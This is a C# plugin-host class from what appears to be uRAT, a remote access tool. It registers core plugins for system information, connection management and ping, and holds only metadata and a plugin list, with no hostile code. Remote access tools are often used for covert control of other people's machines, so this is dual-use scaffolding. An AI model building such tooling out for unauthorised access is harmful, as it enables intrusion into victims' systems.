using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using uRAT.Client.Plugin.Client;
using uRAT.CorePlugin.BasicSystemInformation;
using uRAT.CorePlugin.ConnectionManagement;
using uRAT.CorePlugin.ConnectionPing;
using uRAT.CorePlugin.ExtendedSystemInformation;
using uRAT.Server.Plugin.Server;


namespace uRAT.CorePlugin
{
    public class CoreServerPluginHost : IServerPluginHost
    {
        public string Name
        {
            get { return "Core plugin"; }
        }

        public string Author
        {
            get { return "ubbelol"; }
        }

        public string Description
        {
            get { return "Contains core functionality for uRAT"; }
        }

        public Version Version
        {
            get { return new Version(1, 0); }
        }

        public Guid AssociatedClientPlugin
        {
            get { return new Guid("c3e0ef75-85c6-4b9a-86b1-795ac5206dd6"); }
        }

        public List<IServerPlugin> Plugins
        {
            get
            {
                return new List<IServerPlugin>
                {
                    new BasicSystemInformationPlugin(),
                    new ConnectionManagementPlugin(),
                    new ConnectionPingPlugin(),
                    new ExtendedSystemInformationPlugin()
                };
            }
        }
    }
}
